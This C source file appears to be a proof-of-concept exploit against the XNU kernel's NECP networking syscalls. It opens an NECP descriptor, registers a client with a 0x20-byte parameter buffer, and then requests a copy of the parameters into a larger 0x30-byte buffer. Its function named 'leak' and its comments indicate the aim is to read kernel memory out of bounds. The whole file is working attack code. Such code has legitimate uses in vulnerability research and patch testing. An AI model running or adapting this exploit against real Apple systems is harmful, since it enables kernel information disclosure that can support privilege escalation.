#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/_types.h>


int open_necp(){
	// 0
	// 4 is observe mode
    int fd = syscall(SYS_necp_open, 0);
    if(fd < 0){
        perror("SYS_necp_open");
        exit(0);
    }
    return fd;
}

// add client
size_t *allocation(int fd){
    // 16 bytes memory for uuid
    size_t *clientid = malloc(0x10);
    char buffer[0x20] = "hello necp this is test";
    size_t buffer_size = 0x20;
    syscall(SYS_necp_client_action, fd, 1, clientid, 16, buffer, buffer_size);
    printf("get client id: %llx %llx\n", clientid[0], clientid[1]);
	return clientid;
}


void leak(int fd, size_t *clientid){
	// size should be larger than 0x20 which is used in the allocation.
	char buffer[0x30] = {};

	// NECP_CLIENT_ACTION_COPY_PARAMETERS is defined in XNU kernel
	syscall(SYS_necp_client_action, fd, /*NECP_CLIENT_ACTION_COPY_PARAMETERS*/ 3,
				clientid, 16, buffer, sizeof(buffer));
	printf("we got buffer : %s\n", buffer);
}

int main(){
	int fd = open_necp();
	size_t *clientid = allocation(fd);
	leak(fd, clientid);
}
